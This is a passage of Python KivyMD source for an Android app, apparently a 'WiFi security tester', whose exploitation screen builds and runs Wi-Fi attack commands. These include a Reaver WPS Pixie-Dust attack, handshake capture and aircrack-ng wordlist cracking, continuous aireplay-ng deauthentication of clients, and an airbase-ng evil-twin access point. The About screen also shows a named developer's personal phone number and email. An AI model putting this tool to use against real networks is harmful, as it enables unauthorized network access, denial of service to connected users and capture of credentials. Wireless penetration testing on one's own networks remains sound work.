        self.attack_dialog.open()

    def start_attack_from_dialog(self, attack_type, net_info):
        self.attack_dialog.dismiss() # Dismiss the dialog
        
        # Switch to the exploitation screen
        self.app.change_screen('exploitation')
        exploit_screen = self.app.sm.get_screen('exploitation')
        
        # Prefill fields based on attack type and net_info
        if attack_type == 'reaver':
            exploit_screen.prefill_wps_attack(net_info.get('bssid', ''))
            self.app.log_manager.add_log(f"Ready for Reaver on {net_info['ssid']}. Check Exploitation tab.")
        elif attack_type == 'airodump':
            exploit_screen.prefill_handshake_capture(net_info.get('bssid', ''), net_info.get('channel', ''))
            self.app.log_manager.add_log(f"Ready for handshake capture on {net_info['ssid']}. Check Exploitation tab.")
        elif attack_type == 'deauth':
            exploit_screen.prefill_deauth_attack(net_info.get('bssid', ''), net_info.get('channel', ''))
            self.app.log_manager.add_log(f"Ready for Deauth attack on {net_info['ssid']}. Check Exploitation tab.")
        elif attack_type == 'eviltwin':
            exploit_screen.prefill_evil_twin(net_info.get('ssid', ''), net_info.get('bssid', ''))
            self.app.log_manager.add_log(f"Ready for Evil Twin for {net_info['ssid']}. Check Exploitation tab.")
        
        # Automatically scroll to the relevant section or highlight it if possible


    def update_language(self, *args):
        # Re-populate tabs to update titles
        if self.scan_results: # Only if there are existing results
            self.populate_tabs() # This will use new language strings

class ExploitationScreen(BaseScreen):
    """
    صفحة الاستغلال المنظمة: واجهة موحدة لكل الهجمات.
    """
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.build_ui()
        self.current_prefill_bssid = "" # To store BSSID from dialog

    def build_ui(self):
        layout = MDBoxLayout(orientation='vertical', padding="20dp", spacing="20dp")
        scroll = ScrollView()
        main_content = MDBoxLayout(orientation='vertical', adaptive_height=True, spacing="20dp", padding="10dp")

        # --- Monitor Mode Control Card ---
        monitor_card = MDCard(padding="15dp", elevation=2, radius=[15,], adaptive_height=True)
        monitor_box = MDBoxLayout(orientation='vertical', spacing="10dp", adaptive_height=True)
        self.monitor_title = MDLabel(font_style="H6")
        self.monitor_iface = MDTextField(hint_text=tr.get("original_interface"), text="wlan0") # Default to wlan0
        
        monitor_btn_box = MDGridLayout(cols=2, spacing="10dp", adaptive_height=True)
        self.start_mon_btn = MDRaisedButton(on_release=self.start_monitor_mode)
        self.stop_mon_btn = MDRaisedButton(on_release=self.stop_monitor_mode, md_bg_color=self.app.theme_cls.error_color)
        monitor_btn_box.add_widget(self.start_mon_btn)
        monitor_btn_box.add_widget(self.stop_mon_btn)
        
        monitor_box.add_widget(self.monitor_title)
        monitor_box.add_widget(self.monitor_iface)
        monitor_box.add_widget(monitor_btn_box)
        monitor_card.add_widget(monitor_box)
        main_content.add_widget(monitor_card)

        # --- WPS Attacks Card (Reaver/Wash related) ---
        wps_card = MDCard(padding="15dp", elevation=2, radius=[15,], adaptive_height=True)
        wps_box = MDBoxLayout(orientation='vertical', spacing="10dp", adaptive_height=True)
        self.wps_title = MDLabel(font_style="H6")
        self.wps_bssid_input = MDTextField(hint_text=tr.get("target_bssid"))
        self.wps_iface_input = MDTextField(hint_text=tr.get("monitor_interface"), text="wlan0mon") # Default to wlan0mon
        self.start_reaver_btn = MDRaisedButton(on_release=self.start_reaver_attack)
        
        wps_box.add_widget(self.wps_title)
        wps_box.add_widget(self.wps_bssid_input)
        wps_box.add_widget(self.wps_iface_input)
        wps_box.add_widget(self.start_reaver_btn) # Reaver attack
        wps_card.add_widget(wps_box)
        main_content.add_widget(wps_card)

        # --- WPA/WPA2 Attacks Card (Handshake/Aircrack-ng) ---
        wpa_card = MDCard(padding="15dp", elevation=2, radius=[15,], adaptive_height=True)
        wpa_box = MDBoxLayout(orientation='vertical', spacing="10dp", adaptive_height=True)
        self.wpa_title = MDLabel(font_style="H6")
        
        # Handshake capture
        self.handshake_bssid_input = MDTextField(hint_text=tr.get("target_bssid"))
        self.handshake_channel_input = MDTextField(hint_text=tr.get("target_channel"))
        self.handshake_iface_input = MDTextField(hint_text=tr.get("monitor_interface"), text="wlan0mon")
        self.handshake_output_prefix = MDTextField(hint_text=tr.get("output_file_prefix"), text="handshake_capture")
        self.start_handshake_btn = MDRaisedButton(on_release=self.start_airodump_capture)
        
        # Aircrack-ng attack
        self.aircrack_cap_file_input = MDTextField(hint_text=tr.get("handshake_cap_file"))
        self.aircrack_wordlist_input = MDTextField(hint_text=tr.get("wordlist_file_path"), readonly=True)
        self.choose_wordlist_btn = MDRaisedButton(text=tr.get("choose_wordlist"), on_release=self.choose_wordlist_file)
        self.start_aircrack_btn = MDRaisedButton(on_release=self.start_aircrack_attack)
        
        wpa_box.add_widget(self.wpa_title)
        wpa_box.add_widget(MDLabel(text="[b]Handshake Capture[/b]", markup=True, adaptive_height=True))
        wpa_box.add_widget(self.handshake_bssid_input)
        wpa_box.add_widget(self.handshake_channel_input)
        wpa_box.add_widget(self.handshake_iface_input)
        wpa_box.add_widget(self.handshake_output_prefix)
        wpa_box.add_widget(self.start_handshake_btn)
        
        wpa_box.add_widget(MDLabel(text="[b]Aircrack-ng Attack[/b]", markup=True, adaptive_height=True))
        wpa_box.add_widget(self.aircrack_cap_file_input)
        wpa_box.add_widget(self.aircrack_wordlist_input)
        wpa_box.add_widget(self.choose_wordlist_btn)
        wpa_box.add_widget(self.start_aircrack_btn)
        wpa_card.add_widget(wpa_box)
        main_content.add_widget(wpa_card)

        # --- Deauthentication Attack Card ---
        deauth_card = MDCard(padding="15dp", elevation=2, radius=[15,], adaptive_height=True)
        deauth_box = MDBoxLayout(orientation='vertical', spacing="10dp", adaptive_height=True)
        self.deauth_title = MDLabel(font_style="H6")
        self.deauth_bssid = MDTextField(hint_text=tr.get("target_bssid"))
        self.deauth_client = MDTextField(hint_text=tr.get("target_client"))
        self.deauth_iface = MDTextField(hint_text=tr.get("monitor_interface"), text="wlan0mon")
        self.start_deauth_btn = MDRaisedButton(on_release=self.start_deauth_attack)
        
        deauth_box.add_widget(self.deauth_title)
        deauth_box.add_widget(self.deauth_bssid)
        deauth_box.add_widget(self.deauth_client)
        deauth_box.add_widget(self.deauth_iface)
        deauth_box.add_widget(self.start_deauth_btn)
        deauth_card.add_widget(deauth_box)
        main_content.add_widget(deauth_card)

        # --- Evil Twin Attack Card ---
        evil_twin_card = MDCard(padding="15dp", elevation=2, radius=[15,], adaptive_height=True)
        evil_twin_box = MDBoxLayout(orientation='vertical', spacing="10dp", adaptive_height=True)
        self.evil_twin_title = MDLabel(font_style="H6")
        self.evil_twin_ssid_input = MDTextField(hint_text=tr.get("ssid_to_clone"))
        self.evil_twin_iface_input = MDTextField(hint_text=tr.get("monitor_interface"), text="wlan0mon")
        self.start_evil_twin_btn = MDRaisedButton(on_release=self.start_evil_twin_attack)
        
        evil_twin_box.add_widget(self.evil_twin_title)
        evil_twin_box.add_widget(self.evil_twin_ssid_input)
        evil_twin_box.add_widget(self.evil_twin_iface_input)
        evil_twin_box.add_widget(self.start_evil_twin_btn)
        evil_twin_card.add_widget(evil_twin_box)
        main_content.add_widget(evil_twin_card)


        scroll.add_widget(main_content)
        layout.add_widget(scroll)

        # Stop All Attacks Floating Action Button
        self.stop_all_attacks_fab = MDFloatingActionButton(
            icon="stop",
            pos_hint={'center_x': 0.5, 'center_y': 0.05},
            md_bg_color=self.app.theme_cls.error_color,
            on_release=lambda x: self.app.tool_executor.stop_all()
        )
        layout.add_widget(self.stop_all_attacks_fab)

        self.add_widget(layout)
        self.update_language()

    # --- Prefill Methods (called from DiscoveryScreen) ---
    def prefill_wps_attack(self, bssid):
        self.wps_bssid_input.text = bssid
        self.app.log_manager.add_log(f"WPS BSSID pre-filled: {bssid}. Check WPS Attacks section.")
    
    def prefill_handshake_capture(self, bssid, channel):
        self.handshake_bssid_input.text = bssid
        self.handshake_channel_input.text = channel
        self.app.log_manager.add_log(f"Handshake fields pre-filled for {bssid} on Channel {channel}. Check WPA/WPA2 Attacks section.")

    def prefill_deauth_attack(self, bssid, channel=""): # Channel not used by deauth, but for consistency
        self.deauth_bssid.text = bssid
        self.app.log_manager.add_log(f"Deauth BSSID pre-filled: {bssid}. Check Deauthentication Attack section.")

    def prefill_evil_twin(self, ssid, bssid=""): # BSSID not always used by airbase-ng
        self.evil_twin_ssid_input.text = ssid
        self.app.log_manager.add_log(f"Evil Twin SSID pre-filled: {ssid}. Check Evil Twin Attack section.")


    # --- Attack Execution Methods ---
    def start_monitor_mode(self, instance):
        iface = self.monitor_iface.text.strip()
        if not iface: return
        self.app.log_manager.add_log(f"Starting monitor mode on {iface}...")
        self.app.tool_executor.execute(['airmon-ng', 'start', iface], requires_root=True, callback=self.app.log_manager.add_log, process_key='airmon_start')

    def stop_monitor_mode(self, instance):
        # Airmon-ng usually creates a new interface like 'wlan0mon'. Stop that.
        monitor_iface = self.handshake_iface_input.text.strip() # Assuming this holds the active monitor interface
        if not monitor_iface or monitor_iface == "wlan0": # Prevent stopping main interface by mistake
            self.app.log_manager.add_log("Error: Please specify the correct monitor interface (e.g., wlan0mon) to stop.")
            return
        self.app.log_manager.add_log(f"Stopping monitor mode on {monitor_iface}...")
        self.app.tool_executor.execute(['airmon-ng', 'stop', monitor_iface], requires_root=True, callback=self.app.log_manager.add_log, process_key='airmon_stop')

    def start_reaver_attack(self, instance):
        bssid = self.wps_bssid_input.text.strip()
        iface = self.wps_iface_input.text.strip()
        if not bssid or not iface:
            Snackbar(text=tr.get("bssid_iface_required")).open(); return
        self.app.log_manager.add_log(f"Starting Reaver Pixie-Dust attack on {bssid} using {iface}...")
        command = ['reaver', '-i', iface, '-b', bssid, '-K', '1', '-vv']
        self.app.tool_executor.execute(command, requires_root=True, callback=self.app.log_manager.add_log, process_key='reaver')

    def start_airodump_capture(self, instance):
        bssid = self.handshake_bssid_input.text.strip()
        channel = self.handshake_channel_input.text.strip()
        iface = self.handshake_iface_input.text.strip()
        outfile_prefix = self.handshake_output_prefix.text.strip()
        
        if not all([bssid, channel, iface, outfile_prefix]):
            Snackbar(text=tr.get("all_handshake_fields_required")).open(); return
        
        # Airodump-ng adds -01.cap automatically. Store the base path.
        full_output_path = os.path.join(self.app.user_data_dir, outfile_prefix)
        
        self.app.log_manager.add_log(f"Starting airodump-ng to capture handshake from {bssid} on channel {channel}...")
        command = ['airodump-ng', '--bssid', bssid, '-c', channel, '-w', full_output_path, iface]
        self.app.tool_executor.execute(command, requires_root=True, callback=self.app.log_manager.add_log, process_key='airodump')
        
        # Inform user about expected output file name for aircrack-ng
        expected_cap_file = f"{full_output_path}-01.cap"
        self.aircrack_cap_file_input.text = expected_cap_file # Prefill for aircrack-ng

    def choose_wordlist_file(self, instance):
        if not filechooser:
            Snackbar(text="File chooser is not available on this platform.").open(); return
        filechooser.open_file(on_selection=self.on_wordlist_selection, filters=['*.txt', '*'])

    def on_wordlist_selection(self, selection):
        if selection:
            filepath = selection[0]
            self.aircrack_wordlist_input.text = filepath
            self.app.log_manager.add_log(f"Wordlist selected: {filepath}")
        else:
            self.app.log_manager.add_log("Wordlist selection cancelled.")
    
    def start_aircrack_attack(self, instance):
        cap_file = self.aircrack_cap_file_input.text.strip()
        wordlist = self.aircrack_wordlist_input.text.strip()
        
        if not cap_file or not wordlist:
            Snackbar(text=tr.get("cap_wordlist_required")).open(); return
        if not os.path.exists(cap_file):
            Snackbar(text=tr.get("handshake_not_found")).open(); return
        if not os.path.exists(wordlist):
            Snackbar(text=tr.get("wordlist_not_found")).open(); return

        self.app.log_manager.add_log("Starting aircrack-ng with wordlist...")
        command = ['aircrack-ng', cap_file, '-w', wordlist]
        self.app.tool_executor.execute(command, requires_root=True, callback=self.app.log_manager.add_log, process_key='aircrack')

    def start_deauth_attack(self, instance):
        bssid = self.deauth_bssid.text.strip()
        client = self.deauth_client.text.strip() # Optional
        iface = self.deauth_iface.text.strip()
        if not bssid or not iface:
            Snackbar(text=tr.get("bssid_iface_required")).open(); return
        
        self.app.log_manager.add_log(f"Starting deauthentication attack on {bssid}...")
        command = ['aireplay-ng', '--deauth', '0', '-a', bssid]
        if client: command.extend(['-c', client])
        command.append(iface)
        
        self.app.tool_executor.execute(command, requires_root=True, callback=self.app.log_manager.add_log, process_key='aireplay_deauth')

    def start_evil_twin_attack(self, instance):
        ssid = self.evil_twin_ssid_input.text.strip()
        iface = self.evil_twin_iface_input.text.strip()
        if not ssid or not iface:
            Snackbar(text=tr.get("ssid_iface_required")).open(); return
            
        self.app.log_manager.add_log(f"Starting Evil Twin (airbase-ng) for SSID '{ssid}'...")
        # airbase-ng -a <fake_mac> --essid <ssid> -c <channel> <iface>
        # Note: Channel is often recommended for stability. Using a dummy MAC.
        # This is a basic setup, advanced usage involves routing, DHCP, etc.
        command = ['airbase-ng', '-a', '00:11:22:33:44:55', '--essid', ssid, '-c', '6', iface] # Hardcoded channel 6 for example
        self.app.tool_executor.execute(command, requires_root=True, callback=self.app.log_manager.add_log, process_key='airbase')


    def update_language(self, *args):
        self.monitor_title.text = tr.get("monitor_mode_control")
        self.monitor_iface.hint_text = tr.get("original_interface")
        self.start_mon_btn.text = tr.get("start_monitor_mode")
        self.stop_mon_btn.text = tr.get("stop_monitor_mode")
        
        self.wps_title.text = tr.get("wps_attacks")
        self.wps_bssid_input.hint_text = tr.get("target_bssid")
        self.wps_iface_input.hint_text = tr.get("monitor_interface")
        self.start_reaver_btn.text = tr.get("start_reaver")

        self.wpa_title.text = tr.get("wpa_attacks")
        self.handshake_bssid_input.hint_text = tr.get("target_bssid")
        self.handshake_channel_input.hint_text = tr.get("target_channel")
        self.handshake_iface_input.hint_text = tr.get("monitor_interface")
        self.handshake_output_prefix.hint_text = tr.get("output_file_prefix")
        self.start_handshake_btn.text = tr.get("capture_handshake")
        self.aircrack_cap_file_input.hint_text = tr.get("handshake_cap_file")
        self.aircrack_wordlist_input.hint_text = tr.get("wordlist_file_path")
        self.choose_wordlist_btn.text = tr.get("choose_wordlist")
        self.start_aircrack_btn.text = tr.get("start_aircrack_attack")

        self.deauth_title.text = tr.get("deauth_attack")
        self.deauth_bssid.hint_text = tr.get("target_bssid")
        self.deauth_client.hint_text = tr.get("target_client")
        self.deauth_iface.hint_text = tr.get("monitor_interface")
        self.start_deauth_btn.text = tr.get("start_deauth")

        self.evil_twin_title.text = tr.get("mitm_attacks")
        self.evil_twin_ssid_input.hint_text = tr.get("ssid_to_clone")
        self.evil_twin_iface_input.hint_text = tr.get("monitor_interface")
        self.start_evil_twin_btn.text = tr.get("start_evil_twin")


class ToolsScreen(BaseScreen):
    """
    صفحة الأدوات: تفحص وتعرض حالة كل أداة مدمجة.
    """
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.build_ui()

    def build_ui(self):
        layout = MDBoxLayout(orientation='vertical', padding="10dp", spacing="10dp")
        self.tools_list_widget = MDList()
        scroll = ScrollView()
        scroll.add_widget(self.tools_list_widget)
        
        self.check_btn = MDRaisedButton(on_release=self.check_tools)
        layout.add_widget(self.check_btn)
        layout.add_widget(scroll)
        self.add_widget(layout)
        self.update_language()
        
    def on_enter(self, *args):
        # Automatically check tools when entering the screen
        self.check_tools()

    def check_tools(self, *args):
        self.tools_list_widget.clear_widgets()
        tools_path = os.path.join(self.app.user_data_dir, 'tools')
        
        if not os.path.isdir(tools_path):
            self.app.log_manager.add_log(f"Tools directory not found: {tools_path}"); return
        
        # Add common tools for a comprehensive check
        expected_tools = [
            'airmon-ng', 'airodump-ng', 'aircrack-ng', 'aireplay-ng',
            'airbase-ng', 'reaver', 'wash', 'busybox', 'mdk3', 'iw'
        ]
        
        for tool in expected_tools:
            tool_path = os.path.join(tools_path, tool)
            status_text = tr.get("tool_missing")
            icon = "alert-circle"
            color = "F44336" # Red
            
            if os.path.exists(tool_path) and os.access(tool_path, os.X_OK):
                status_text = tr.get("tool_ready")
                icon = "check-circle"
                color = "4CAF50" # Green
                
                # Optional: Try to get version info if tool is ready
                # This can be slow or problematic for some tools, use with caution.
                # try:
                #     result = subprocess.run([tool_path, '--version'], capture_output=True, text=True, timeout=2)
                #     version_info = result.stdout.strip().split('\n')[0]
                #     status_text += f" ({version_info})"
                # except Exception:
                #     pass # Ignore errors if version can't be fetched
            
            item = TwoLineAvatarIconListItem(text=tool, secondary_text=status_text)
            item.add_widget(IconLeftWidget(icon=icon, theme_text_color="Custom", text_color=get_color_from_hex(color)))
            self.tools_list_widget.add_widget(item)

    def update_language(self, *args):
        self.check_btn.text = tr.get("check_tool_status")
        # No need to re-check tools, just update button text

class SettingsScreen(BaseScreen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.build_ui()

    def build_ui(self):
        layout = MDBoxLayout(orientation='vertical', padding="20dp", spacing="20dp")
        
        # Language Card
        lang_card = MDCard(padding="15dp", elevation=2, radius=[15,], adaptive_height=True)
        lang_box = MDBoxLayout(orientation='vertical', spacing="10dp", adaptive_height=True)
        self.lang_title = MDLabel(font_style="H6")
        
        en_btn = MDRaisedButton(text="English", on_release=lambda x: self.app.set_language("en"))
        ar_btn = MDRaisedButton(text="العربية", on_release=lambda x: self.app.set_language("ar"), font_name="Roboto") # Assuming Roboto supports Arabic
        
        lang_btn_box = MDGridLayout(cols=2, spacing="10dp", adaptive_height=True)
        lang_btn_box.add_widget(en_btn)
        lang_btn_box.add_widget(ar_btn)
        
        lang_box.add_widget(self.lang_title)
        lang_box.add_widget(lang_btn_box)
        lang_card.add_widget(lang_box)

        # Theme Card
        theme_card = MDCard(padding="15dp", elevation=2, radius=[15,], adaptive_height=True)
        theme_box = MDBoxLayout(orientation='vertical', spacing="10dp", adaptive_height=True)
        self.theme_title = MDLabel(font_style="H6")
        
        dark_mode_btn = MDRaisedButton(text=tr.get("dark_mode"), on_release=lambda x: self.app.set_theme("Dark"))
        light_mode_btn = MDRaisedButton(text=tr.get("light_mode"), on_release=lambda x: self.app.set_theme("Light"))
        
        theme_btn_box = MDGridLayout(cols=2, spacing="10dp", adaptive_height=True)
        theme_btn_box.add_widget(dark_mode_btn)
        theme_btn_box.add_widget(light_mode_btn)
        
        theme_box.add_widget(self.theme_title)
        theme_box.add_widget(theme_btn_box)
        theme_card.add_widget(theme_box)

        # PDF Export Card
        pdf_card = MDCard(padding="15dp", elevation=2, radius=[15,], adaptive_height=True)
        self.pdf_export_btn = MDRaisedButton(on_release=self.export_pdf)
        pdf_card.add_widget(self.pdf_export_btn)
        
        layout.add_widget(lang_card)
        layout.add_widget(theme_card)
        layout.add_widget(pdf_card)
        layout.add_widget(BoxLayout()) # Spacer
        self.add_widget(layout)
        self.update_language()

    def export_pdf(self, instance):
        self.app.log_manager.add_log(tr.get("export_pdf_report"))
        system_info = {
            tr.get('root_access'): check_root()[1],
            tr.get('app_title'): tr.get('app_title') + " v9.0",
            tr.get('developer'): "Ahmed Mustafa Ibrahim"
        }
        report_path = self.app.report_generator.generate_pdf(self.app.last_scan_results, system_info)
        
        if report_path:
            Snackbar(text=tr.get("report_generated").format(os.path.basename(report_path))).open()
        else:
            Snackbar(text=tr.get("report_failed")).open()

    def update_language(self, *args):
        self.lang_title.text = tr.get("language")
        self.theme_title.text = tr.get("theme")
        self.pdf_export_btn.text = tr.get("export_pdf_report")

class AboutScreen(BaseScreen):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.build_ui()

    def build_ui(self):
        layout = MDBoxLayout(orientation='vertical', padding="20dp", spacing="20dp")
        
        # App Info Card
        app_card = MDCard(padding="15dp", elevation=2, radius=[15,], adaptive_height=True)
        app_box = MDBoxLayout(orientation='vertical', adaptive_height=True, spacing="10dp")
        self.title_label = MDLabel(font_style="H5", adaptive_height=True, halign="center")
        self.version_label = MDLabel(font_style="Body1", adaptive_height=True, halign="center")
        app_box.add_widget(self.title_label)
        app_box.add_widget(self.version_label)
        app_card.add_widget(app_box)
        
        # Developer Info Card
        dev_card = MDCard(padding="15dp", elevation=2, radius=[15,], adaptive_height=True)
        dev_box = MDBoxLayout(orientation='vertical', adaptive_height=True, spacing="10dp")
        self.dev_title = MDLabel(font_style="H6")
        dev_box.add_widget(self.dev_title)
        dev_box.add_widget(MDLabel(text="Ahmed Mustafa Ibrahim", adaptive_height=True))
        
        dev_box.add_widget(MDBoxLayout(adaptive_height=True, children=[MDIcon(icon="phone"), MDLabel(text=tr.get("phone") + ": 01225155329", adaptive_height=True)]))
        dev_box.add_widget(MDBoxLayout(adaptive_height=True, children=[MDIcon(icon="email"), MDLabel(text=tr.get("email") + ": GOGOM8870@GMAIL.COM", adaptive_height=True)]))
        dev_card.add_widget(dev_box)

        # Disclaimer Card
        disclaimer_card = MDCard(padding="15dp", md_bg_color=self.app.theme_cls.error_color, elevation=2, radius=[15,], adaptive_height=True)
        disclaimer_box = MDBoxLayout(orientation='vertical', adaptive_height=True, spacing="10dp")
        self.disclaimer_title = MDLabel(font_style="H6", theme_text_color="Custom", text_color=(1,1,1,1))
        self.disclaimer_text_label = MDLabel(adaptive_height=True, theme_text_color="Custom", text_color=(1,1,1,1))
        disclaimer_box.add_widget(self.disclaimer_title)
        disclaimer_box.add_widget(self.disclaimer_text_label)
        disclaimer_card.add_widget(disclaimer_box)
        
        layout.add_widget(app_card)
        layout.add_widget(dev_card)
        layout.add_widget(disclaimer_card)
        layout.add_widget(BoxLayout()) # Spacer

        self.add_widget(layout)
        self.update_language()

    def update_language(self, *args):
        self.title_label.text = tr.get("about_title")
        self.version_label.text = f"{tr.get('version')} 9.0"
        self.dev_title.text = tr.get("developer")
        self.disclaimer_title.text = tr.get("disclaimer")
        self.disclaimer_text_label.text = tr.get("disclaimer_text")


# ==============================================================================
# 4. Main Application Class
# ==============================================================================
class WiFiSecurityTesterApp(MDApp):
    language = StringProperty("en")
    
    def build(self):
        self.theme_cls.theme_style = "Dark"
        self.theme_cls.primary_palette = "Blue"
        self.theme_cls.accent_palette = "Cyan"

        # --- App Data Directory Setup ---
        if platform == 'android': self.user_data_dir = self.get_user_data_dir()
        else: self.user_data_dir = os.path.join(os.path.dirname(__file__), 'app_data_final')
        os.makedirs(os.path.join(self.user_data_dir, 'tools'), exist_ok=True)
        
        # --- Initialize Log Panel and Managers ---
        self.log_widget = LogPanel(size_hint_y=0.3) # Instantiate LogPanel here
        self.log_manager = LogManager(self.log_widget) # Pass the instance
        self.tool_executor = ToolExecutor(self.log_manager, self.user_data_dir)
        self.wifi_scanner = WifiScanner(self.log_manager)
        self.network_analyzer = NetworkAnalyzer()
        self.report_generator = ReportGenerator(self.log_manager, self.user_data_dir)
        self.last_scan_results = [] # To store results for PDF report

        # --- Build UI Layout ---
        root_layout = MDBoxLayout(orientation='vertical')
        
        self.top_app_bar = MDTopAppBar(elevation=4)
        self.top_app_bar.right_action_items = [["theme-light-dark", lambda x: self.toggle_theme()]]
        
        self.sm = ScreenManager(transition=FadeTransition())
        self.sm.add_widget(HomeScreen(name='home'))
        self.sm.add_widget(DiscoveryScreen(name='discovery'))
        self.sm.add_widget(ExploitationScreen(name='exploitation'))
        self.sm.add_widget(ToolsScreen(name='tools'))
        self.sm.add_widget(SettingsScreen(name='settings'))
        self.sm.add_widget(AboutScreen(name='about'))
        
        self.bottom_nav = MDBottomNavigation(panel_color=self.theme_cls.bg_dark)
        
        root_layout.add_widget(self.top_app_bar)
        root_layout.add_widget(self.sm)
        root_layout.add_widget(self.log_widget) # Add the LogPanel instance
        root_layout.add_widget(self.bottom_nav)

        self.update_language_and_ui() # Initial UI setup and language
        return root_layout
    
    def on_start(self):
        self.log_manager.add_log(tr.get("app_title") + " v9.0 " + tr.get("checking"))
        self.extract_and_prepare_tools()

    def toggle_theme(self):
        self.theme_cls.theme_style = "Light" if self.theme_cls.theme_style == "Dark" else "Dark"
    
    def set_theme(self, theme_name): # New method for explicit theme setting
        self.theme_cls.theme_style = theme_name

    def set_language(self, lang_code):
        self.language = lang_code
        tr.set_language(lang_code)
        self.update_language_and_ui() # Update all UI elements and tabs

    def update_language_and_ui(self, *args):
        self.top_app_bar.title = tr.get("app_title")
        self.bottom_nav.clear_widgets() # Clear and re-add tabs to update text
        
        tabs_config = {
            'home': {'text': tr.get('home'), 'icon': 'home'},
            'discovery': {'text': tr.get('discovery'), 'icon': 'radar'},
            'exploitation': {'text': tr.get('exploitation'), 'icon': 'sword-cross'},
            'tools': {'text': tr.get('tools'), 'icon': 'hammer-wrench'},
            'settings': {'text': tr.get('settings'), 'icon': 'cog'},
            'about': {'text': tr.get('about'), 'icon': 'information-outline'},
        }
        
        for name, config in tabs_config.items():
            item = MDBottomNavigationItem(name=name, text=config['text'], icon=config['icon'], on_tab_press=self.on_tab_press)
            self.bottom_nav.add_widget(item)

    def on_tab_press(self, instance_tabs):
        self.sm.current = instance_tabs.name
    
    def change_screen(self, screen_name):
        self.sm.current = screen_name
        # Ensure bottom nav highlights the correct tab
        for item in self.bottom_nav.children:
            if item.name == screen_name:
                self.bottom_nav.switch_tab(item.name)
                break

    def on_discovery_results(self, results):
        """Callback from DiscoveryScreen to store latest scan results for PDF."""
        self.last_scan_results = results

    def extract_and_prepare_tools(self):
        self.log_manager.add_log(tr.get("current_active_attacks")) # This line was misplaced
        self.log_manager.add_log("--- " + tr.get("check_tool_status") + " ---")
        target_tools_dir = os.path.join(self.user_data_dir, 'tools')
        
        if platform == 'android':
            from kivy.resources import resource_find
            source_dir = resource_find('wimax/assets/tools')
        else:
            source_dir = os.path.join(os.path.dirname(__file__), 'wimax/assets/tools')

        if not source_dir or not os.path.isdir(source_dir):
            self.log_manager.add_log(f"CRITICAL: Tools source directory not found: {source_dir}. Please check your 'wimax/assets/tools' folder."); return

        tools_to_extract = os.listdir(source_dir)
        for tool in tools_to_extract:
            source_path = os.path.join(source_dir, tool)
            target_path = os.path.join(target_tools_dir, tool)
            try:
                import shutil
                shutil.copy(source_path, target_path)
                os.chmod(target_path, 0o755) # Grant full execute permissions
                self.log_manager.add_log(f"Synced & Set +x: {tool}")
            except Exception as e:
                self.log_manager.add_log(f"Error syncing {tool}: {e}")
        self.log_manager.add_log("--- Tool setup finished ---")

if __name__ == '__main__':
    # Register font for Arabic support (assuming 'Roboto' or similar TTF is available in assets/fonts)
    # You might need to place a 'Roboto.ttf' file in wimax/assets/fonts/
    from kivy.core.text import LabelBase
    try:
        LabelBase.register(name="Roboto", fn_regular=os.path.join(os.path.dirname(__file__), 'wimax/assets/fonts/Roboto.ttf'))
    except Exception:
        print("Warning: Roboto font not found or could not be registered.")
        pass # Continue without custom font if not found

    WiFiSecurityTesterApp().run()
